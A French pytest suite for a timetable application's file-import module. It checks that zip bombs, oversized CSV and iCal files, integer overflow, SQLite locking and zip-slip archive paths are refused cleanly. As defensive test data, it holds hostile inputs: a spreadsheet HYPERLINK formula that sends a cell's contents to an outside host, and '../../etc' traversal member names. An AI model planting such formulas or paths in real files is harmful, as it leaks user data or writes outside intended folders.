"""Bornes contre les fichiers hostiles (site public) et corrections de la revue d'ensemble.

Chaque constat bloquant est reproduit (archive bombe, fichier trop long,
page qui gèle le serveur) et le refus propre est vérifié.
"""

from __future__ import annotations

import contextlib
import datetime as dt
import io
import itertools
import sqlite3
import threading
import time
import zipfile

import pytest
from sqlalchemy import select
from tests.outils.echange.fabrique import (
    archive_zip,
    calendrier_ical,
    classeur,
    compter,
    csv_envoye,
    erreurs,
    seul,
)

from edt.db import modeles as m
from edt.db.moteur import session_base
from edt.domaine.enumerations import Gravite
from edt.echange import ical, lecture, valeurs
from edt.echange.format import FEUILLES
from edt.echange.lecture import FichierEnvoye, Limites, lire_fichier
from edt.echange.rapport import ListeSignalements, RapportImport, Signalement, rapport_csv
from edt.echange.transaction import simulation_possible
from edt.erreurs import ErreurIntrouvable
from edt.services import echange as service
from edt.services.echange import ModeImport, OptionsImport

# --------------------------------------------------------------------------- #
# Constat 2 : archive bombe
# --------------------------------------------------------------------------- #


def test_archive_bombe_refusee_avant_decompression():
    """40 Ko qui feraient 21 Mo de retours à la ligne une fois décompressés."""
    bombe = archive_zip({"salles.csv": b"code;campus\n" + b"\n" * (21 * 1024 * 1024)})
    assert len(bombe) < 100 * 1024

    debut = time.perf_counter()
    lu, signalements = lire_fichier(FichierEnvoye("bombe.zip", bombe))

    assert time.perf_counter() - debut < 2
    assert lu.tableaux == ()
    (message,) = erreurs(signalements)
    assert "Archive ZIP refusé" in message and "décompressé" in message and "20 Mo" in message


def test_archive_de_plus_de_50_fichiers_refusee():
    archive = archive_zip({f"salles_{i}.csv": b"code;campus\nN1;NDC\n" for i in range(51)})
    lu, signalements = lire_fichier(FichierEnvoye("trop.zip", archive))
    assert lu.tableaux == ()
    assert "51 fichiers" in erreurs(signalements)[0]


def test_membre_abime_signale_sans_planter():
    contenu = archive_zip(
        {"campus.csv": b"code;nom\n" + b"NDC;Notre-Dame\n" * 200, "salles.csv": b"code\n"}
    )
    abime = bytearray(contenu)
    position = abime.index(b"campus.csv") + len("campus.csv") + 10  # dans les données compressées
    abime[position] ^= 0xFF
    lu, signalements = lire_fichier(FichierEnvoye("abime.zip", bytes(abime)))
    assert any("illisible" in m for m in erreurs(signalements))
    assert [t.nom for t in lu.tableaux] == ["salles.csv"]  # le membre sain est lu


def test_classeur_bombe_refuse_avant_openpyxl():
    bombe = archive_zip(
        {
            "[Content_Types].xml": b"<Types/>",
            "xl/workbook.xml": b"<workbook/>",
            "xl/sharedStrings.xml": b"<sst>" + b" " * (21 * 1024 * 1024) + b"</sst>",
        }
    )
    lu, signalements = lire_fichier(FichierEnvoye("bombe.xlsx", bombe))
    assert lu.tableaux == ()
    assert "Classeur Excel refusé" in erreurs(signalements)[0]


def test_le_gabarit_reste_sous_les_bornes_d_un_classeur(base):
    with session_base() as session:
        gabarit = service.produire_gabarit(session, "xlsx")
    with zipfile.ZipFile(io.BytesIO(gabarit.contenu)) as archive:
        assert len(archive.infolist()) <= lecture.MAX_MEMBRES_CLASSEUR
    lu, signalements = lire_fichier(FichierEnvoye(gabarit.nom, gabarit.contenu))
    assert erreurs(signalements) == [] and len(lu.tableaux) == len(FEUILLES)


# --------------------------------------------------------------------------- #
# Constat 3 : fichier trop long, page géante, boucle d'événements gelée
# --------------------------------------------------------------------------- #


def test_fichier_de_retours_a_la_ligne_refuse_sans_tout_lire():
    """19 Mo de lignes vides : la lecture s'arrête à 100 000 lignes lues."""
    texte = b"libelle;date_debut;date_fin\n" + b"\n" * (19 * 1024 * 1024)
    debut = time.perf_counter()
    lu, signalements = lire_fichier(FichierEnvoye("annees.csv", texte))
    assert time.perf_counter() - debut < 5
    assert lu.tableaux == ()
    assert f"plus de {lecture.MAX_LIGNES_LUES} lignes" in erreurs(signalements)[0]


def test_tableau_trop_long_refuse_avec_un_message_clair():
    lignes = "".join(f"A{i};x;y\n" for i in range(lecture.MAX_LIGNES_TABLEAU + 1))
    lu, signalements = lire_fichier(
        FichierEnvoye("annees.csv", ("libelle;a;b\n" + lignes).encode())
    )
    assert lu.tableaux == ()
    (message,) = erreurs(signalements)
    assert f"plus de {lecture.MAX_LIGNES_TABLEAU} lignes de données" in message
    assert "Découper" in message


def test_budget_de_lignes_partage_par_l_envoi():
    limites = Limites(lignes_restantes=5)
    premier, _ = lire_fichier(FichierEnvoye("a.csv", b"code;nom\n" + b"A;a\n" * 3), limites)
    second, signalements = lire_fichier(
        FichierEnvoye("b.csv", b"code;nom\n" + b"B;b\n" * 3), limites
    )
    assert len(premier.tableaux[0].lignes) == 3
    assert second.tableaux == () and "au total" in erreurs(signalements)[0]


def test_trop_de_colonnes_et_cellule_geante():
    large = lire_fichier(FichierEnvoye("x.csv", b"code;nom\n" + b";" * 600 + b"z\n"))
    assert "colonnes" in erreurs(large[1])[0]
    geante = lire_fichier(FichierEnvoye("x.csv", b'code;nom\nA;"' + b"x" * 200_000 + b'"\n'))
    assert "CSV illisible" in erreurs(geante[1])[0]


def test_ical_trop_d_evenements_ou_regle_trop_dense(monkeypatch):
    evenement = "BEGIN:VEVENT\nUID:{0}\nDTSTAMP:20260901T000000Z\nDTSTART:20261005T083000\nDTEND:20261005T103000\n{1}END:VEVENT\n"
    texte = "BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//t//FR\n{}END:VCALENDAR\n"
    monkeypatch.setattr(ical, "MAX_EVENEMENTS", 2)
    seances, signalements = ical.lire_ical(
        "a.ics", texte.format("".join(evenement.format(i, "") for i in range(3)))
    )
    assert seances == [] and "3 événements" in erreurs(signalements)[0]

    dense = texte.format(evenement.format("m", "RRULE:FREQ=MINUTELY\n"))
    seances, signalements = ical.lire_ical(
        "b.ics", dense, (dt.date(2026, 9, 7), dt.date(2027, 1, 29))
    )
    assert seances == [] and "répétition « MINUTELY »" in erreurs(signalements)[0]

    sans_fin = texte.format(evenement.format("j", "RRULE:FREQ=DAILY\n"))
    seances, signalements = ical.lire_ical("c.ics", sans_fin)  # ni fin ni période
    assert seances == [] and "plus de 1000 occurrences" in erreurs(signalements)[0]


def test_signalements_bornes_et_comptes():
    liste = ListeSignalements(maximum=2)
    liste.extend(Signalement(Gravite.ERREUR, f"ligne {i}") for i in range(5))
    liste.append(Signalement(Gravite.INFORMATION, "info"))
    assert len(liste) == 2 and (liste.omis, liste.erreurs_omises) == (4, 3)
    rapport = RapportImport(
        "donnees", True, ("a.csv",), (), tuple(liste), signalements_omis=4, erreurs_omises=3
    )
    assert rapport.nb_signalements == 6 and rapport.nb_erreurs == 5 and rapport.a_des_rejets
    assert "4 autre(s) signalement(s) non détaillé(s), dont 3 erreur(s)" in rapport_csv(
        rapport
    ).decode("utf-8-sig")


# --------------------------------------------------------------------------- #
# Constats 4 et 5
# --------------------------------------------------------------------------- #


def test_formules_neutralisees_dans_les_csv_et_relues_a_l_identique(
    jeu_minimal, importer, exporter
):
    formule = '=HYPERLINK("http://exemple.invalid/?x="&A1;"clic")'
    with session_base() as session:
        matiere = session.scalar(select(m.Matiere).where(m.Matiere.code == "IM.1101"))
        matiere.libelle = formule
        salle = session.scalar(select(m.Salle).where(m.Salle.code == "N016"))
        salle.etage = -1
    with session_base() as session:
        archive = service.exporter_donnees(session, "zip")
    with zipfile.ZipFile(io.BytesIO(archive.contenu)) as contenu:
        matieres = contenu.read("matieres.csv").decode("utf-8-sig")
        salles = contenu.read("salles.csv").decode("utf-8-sig")
    assert '" =HYPERLINK' in matieres and "\n=" not in matieres and ";=" not in matieres
    assert ";-1;" in salles  # un nombre négatif n'est pas une formule

    rapport = importer(FichierEnvoye(archive.nom, archive.contenu), simuler=True)
    assert rapport.bilan("matieres").compteurs == {"inchanges": 6}  # relu à l'identique
    assert any(x["libelle"] == formule for x in exporter()["matieres"])


def test_import_d_emploi_du_temps_limite_aussi_l_ical(jeu_minimal, importer, monkeypatch):
    monkeypatch.setattr(ical, "MAX_EVENEMENTS", 1)
    texte = (
        "BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//t//FR\n"
        + "".join(
            f"BEGIN:VEVENT\nUID:{i}\nDTSTAMP:20260901T000000Z\nDTSTART:20261005T083000\n"
            "DTEND:20261005T103000\nEND:VEVENT\n"
            for i in range(2)
        )
        + "END:VCALENDAR\n"
    )
    rapport = importer(
        FichierEnvoye("agenda.ics", texte.encode()),
        mode=ModeImport.A_REPLACER,
        semestre_id=jeu_minimal.semestre_id,
        simuler=True,
    )
    assert rapport.a_des_rejets and "2 événements" in erreurs(rapport.signalements)[0]


# --------------------------------------------------------------------------- #
# Cas limites des bornes (banque de tests)
# --------------------------------------------------------------------------- #

ENORME = 10**20
"""Au-delà des entiers de SQLite (2**63 - 1) : faisait planter le flush."""


@pytest.mark.cas_limite
@pytest.mark.parametrize("simuler", [True, False], ids=["simulation", "application"])
@pytest.mark.parametrize(
    ("nom", "entete", "valide", "enorme", "colonne", "modele"),
    [
        (
            "salles.csv",
            "code;campus;capacite;type",
            "N900;NDC;30;COURS",
            f"N901;NDC;{ENORME};COURS",
            "capacite",
            m.Salle,
        ),
        (
            "groupes.csv",
            "annee;code;libelle;nature;effectif",
            "2026-2027;GF1;Groupe fictif 1;classe;20",
            f"2026-2027;GF2;Groupe fictif 2;classe;{ENORME}",
            "effectif",
            m.Groupe,
        ),
        (
            "besoins.csv",
            "annee;semestre;matiere;type;groupes;duree;nombre;libelle",
            "2026-2027;S1;IM.1101;TD;A1-G1;2 h;1;Besoin fictif 1",
            f"2026-2027;S1;IM.1101;TD;A1-G1;2 h;{ENORME};Besoin fictif 2",
            "nombre",
            m.Besoin,
        ),
    ],
    ids=["capacite", "effectif", "nombre"],
)
def test_entier_hors_bornes_sqlite_rejette_la_ligne_sans_planter(
    nom, entete, valide, enorme, colonne, modele, simuler, jeu_minimal, importer
):
    """Cas : une capacité, un effectif ou un nombre de séances de 10**20 parmi des lignes valides.

    Risque : OverflowError au flush de SQLite, non capturée : tout l'import échouait
    (erreur 500 ou code 2) et aucune ligne du fichier n'entrait.
    """
    avant = compter(modele)

    rapport = importer(csv_envoye(nom, entete, valide, enorme), simuler=simuler)

    assert rapport.bilan(nom.removesuffix(".csv")).compteurs == {"crees": 1, "rejetes": 1}
    erreur = seul(rapport.signalements, Gravite.ERREUR)
    assert (erreur.ligne, erreur.colonne) == (3, colonne)
    assert "Nombre hors limites" in erreur.message and "1 000 000" in erreur.message
    assert compter(modele) == avant + (0 if simuler else 1)


@pytest.mark.cas_limite
def test_debordement_d_entier_de_sqlite_rejette_sa_ligne_seule(jeu_minimal, importer, monkeypatch):
    """Cas : un entier au-delà de 2**63 atteint la base (borne de lecture levée pour le test).

    Risque : sans filet, OverflowError au flush fait échouer tout l'import au lieu
    de la seule ligne fautive ; c'est la défense en profondeur derrière la borne.
    """
    monkeypatch.setattr(valeurs, "ENTIER_MAX", 10**30)
    entetes = ["code", "campus", "capacite", "type"]
    lignes = [["N900", "NDC", 30, "COURS"], ["N901", "NDC", ENORME, "COURS"]]
    lignes.append(["N902", "NDC", 40, "COURS"])

    rapport = importer(classeur({"salles": [entetes, *lignes]}))

    assert rapport.bilan("salles").compteurs == {"crees": 2, "rejetes": 1}
    erreur = seul(rapport.signalements, Gravite.ERREUR)
    assert erreur.ligne == 3 and "dépasse ce que la base peut enregistrer" in erreur.message
    assert compter(m.Salle) == jeu_minimal.nb_salles + 2


@pytest.mark.cas_limite
def test_import_reserve_la_base_des_son_ouverture(jeu_minimal, environnement):
    """Cas : une autre connexion veut écrire pendant qu'un import a ouvert sa transaction.

    Risque : en transaction différée (BEGIN émis par le moteur), l'import lisait
    sans verrou puis échouait aussitôt « database is locked » si une autre écriture
    avait validé entre-temps (SQLite n'attend pas dans ce cas). simulation_possible
    ouvre la transaction par edt.db.moteur.transaction_immediate (BEGIN IMMEDIATE).
    """
    with session_base() as session, simulation_possible(session, simuler=True):
        autre = sqlite3.connect(environnement / "edt.db", timeout=0)
        try:
            with pytest.raises(sqlite3.OperationalError, match="locked"):
                autre.execute("BEGIN IMMEDIATE")
        finally:
            autre.close()


@pytest.mark.cas_limite
def test_deux_imports_simultanes_sont_serialises_sans_erreur(jeu_minimal):
    """Cas : deux imports appliqués au même moment (deux onglets du navigateur).

    Risque : en transaction différée, le second échouait « base occupée » au lieu
    d'attendre la fin du premier, ou l'un écrasait l'autre. Chaque import ouvre sa
    transaction par edt.db.moteur.transaction_immediate (BEGIN IMMEDIATE) : le
    second attend son tour, dans la limite du délai de verrou du socle.
    """
    depart = threading.Barrier(2)
    rapports, echecs = {}, []

    def importer_(prefixe: str) -> None:
        lignes = (f"{prefixe}{i:03d};NDC;20;COURS" for i in range(200))
        fichier = csv_envoye(f"salles-{prefixe}.csv", "code;campus;capacite;type", *lignes)
        try:
            depart.wait(timeout=10)
            with session_base() as session:
                rapports[prefixe] = service.appliquer_import(
                    session, [fichier], OptionsImport(mode=ModeImport.DONNEES)
                )
        except Exception as erreur:  # rendue par l'assertion ci-dessous
            echecs.append(repr(erreur))

    fils = [threading.Thread(target=importer_, args=(p,)) for p in ("A", "B")]
    for fil in fils:
        fil.start()
    for fil in fils:
        fil.join(timeout=60)

    assert echecs == []
    assert {p: r.bilan("salles").compteurs for p, r in rapports.items()} == {
        "A": {"crees": 200},
        "B": {"crees": 200},
    }
    assert compter(m.Salle) == jeu_minimal.nb_salles + 400


@pytest.mark.perf
@pytest.mark.cas_limite
def test_import_de_dix_mille_lignes_valides_sous_le_seuil(jeu_minimal, importer):
    """Cas : un fichier de 10 000 enseignants valides, simulé (un point de sauvegarde par ligne).

    Risque : une régression de performance (index perdu, requête par ligne) qui
    rendrait l'import d'un vrai établissement interminable, sans aucun test pour le voir.
    """
    lignes = (f"EF{i:05d};Nomfictif{i};Prénom{i}" for i in range(10_000))
    fichier = csv_envoye("enseignants.csv", "identifiant;nom;prenom", *lignes)

    debut = time.perf_counter()
    rapport = importer(fichier, simuler=True)
    duree = time.perf_counter() - debut

    assert rapport.bilan("enseignants").compteurs == {"crees": 10_000}
    assert rapport.signalements == ()
    assert duree < 30, f"{duree:.1f} s"


@pytest.mark.cas_limite
def test_archive_aux_chemins_hostiles_lue_sans_ecriture_sur_disque(
    base, importer, environnement, monkeypatch
):
    """Cas : une archive ZIP aux membres « ../../etc/campus.csv » et « C:\\Windows\\salles.csv ».

    Risque : sûr tant que l'archive est lue en mémoire ; une évolution qui
    l'extrairait écrirait hors du dossier (zip slip), et le rapport afficherait
    des chemins trompeurs.
    """
    travail = environnement / "a" / "b"
    travail.mkdir(parents=True)
    monkeypatch.chdir(travail)
    contenu = archive_zip(
        {
            "../../etc/campus.csv": "code;nom\nZZ;Campus fictif\n",
            "C:\\Windows\\salles.csv": "code;campus;capacite;type\nZ001;ZZ;20;COURS\n",
        }
    )

    rapport = importer(FichierEnvoye("hostile.zip", contenu), simuler=True)

    assert rapport.bilan("campus").compteurs == {"crees": 1}
    assert rapport.bilan("salles").compteurs == {"crees": 1}
    assert list(environnement.rglob("*.csv")) == []  # rien d'extrait, nulle part
    assert not (environnement / "etc").exists()
    noms = [a.fichier for a in rapport.apercus] + [s.fichier for s in rapport.signalements]
    assert noms and all(".." not in nom and ":" not in nom for nom in noms), noms


@pytest.mark.cas_limite
def test_lecture_ical_faite_avant_de_reserver_la_base(
    jeu_minimal, importer, fichier_exemple, environnement, monkeypatch
):
    """Cas : un import d'emploi du temps iCal dont les récurrences prennent du temps à calculer.

    Risque : lu dans la transaction (BEGIN IMMEDIATE), l'agenda réservait la base
    pendant tout son calcul : une saisie simultanée attendait, puis échouait
    « base occupée ».
    """
    ordre = []
    lire_ical_reel, transaction_reelle = service.lire_ical, service.simulation_possible

    def lire_ical_espion(*arguments, **options):
        autre = sqlite3.connect(environnement / "edt.db", timeout=0)
        try:
            autre.execute("BEGIN IMMEDIATE")  # « database is locked » si la base est réservée
            autre.rollback()
        finally:
            autre.close()
        ordre.append("lecture iCal")
        return lire_ical_reel(*arguments, **options)

    @contextlib.contextmanager
    def transaction_espion(*arguments, **options):
        ordre.append("transaction")
        with transaction_reelle(*arguments, **options):
            yield

    monkeypatch.setattr(service, "lire_ical", lire_ical_espion)
    monkeypatch.setattr(service, "simulation_possible", transaction_espion)

    importer(
        fichier_exemple("agenda.ics"),
        mode=ModeImport.A_REPLACER,
        semestre_id=jeu_minimal.semestre_id,
        simuler=True,
    )

    assert ordre == ["lecture iCal", "transaction"]


@pytest.mark.cas_limite
def test_budget_de_calcul_ical_partage_par_l_envoi(jeu_minimal, importer, monkeypatch):
    """Cas : un envoi de quatre fichiers iCal, chacun aux récurrences coûteuses.

    Risque : avec un délai par fichier, un envoi de N fichiers hostiles occupait le
    serveur N fois DELAI_RECURRENCES ; le délai vaut pour tout l'envoi.
    """
    secondes = itertools.count()  # horloge factice : chaque règle coûte deux « secondes »
    monkeypatch.setattr(ical, "_horloge", lambda: next(secondes))
    texte = calendrier_ical(
        "DTSTART:20261005T083000\nDTEND:20261005T103000\nRRULE:FREQ=WEEKLY\n"
        "X-EDT-MATIERE:IM.1101\nX-EDT-TYPE:CM\nX-EDT-GROUPES:A1"
    )
    fichiers = [FichierEnvoye(f"agenda{i}.ics", texte.encode()) for i in range(1, 5)]

    rapport = importer(
        fichiers, mode=ModeImport.A_REPLACER, semestre_id=jeu_minimal.semestre_id, simuler=True
    )

    refuses = {
        s.fichier
        for s in rapport.signalements
        if s.gravite is Gravite.ERREUR and s.message.startswith("Fichier iCal refusé")
    }
    assert refuses == {"agenda3.ics", "agenda4.ics"}  # les deux premiers ont tout consommé


@pytest.mark.cas_limite
def test_service_appele_avec_un_identifiant_hors_base_repond_introuvable(
    jeu_minimal, fichier_exemple
):
    """Cas : un appelant du service (commande, futur assistant) passe un identifiant de 10**20.

    Risque : session.get levait OverflowError, « erreur inattendue » au lieu de
    « n'existe pas » : les bornes des adresses et des options ne protègent pas un
    appel direct du service.
    """
    options = OptionsImport(mode=ModeImport.REFERENCE, semestre_id=ENORME)
    with session_base() as session:
        with pytest.raises(ErreurIntrouvable, match=f"Le semestre {ENORME} n'existe pas"):
            service.simuler_import(session, [fichier_exemple("seances_existantes.csv")], options)
        with pytest.raises(ErreurIntrouvable, match=f"version d'emploi du temps {ENORME}"):
            service.resoudre_filtre(session, ENORME)
        with pytest.raises(ErreurIntrouvable, match="n'existe pas"):
            service.exporter_emploi_du_temps(session, ENORME, groupe_id=-1)
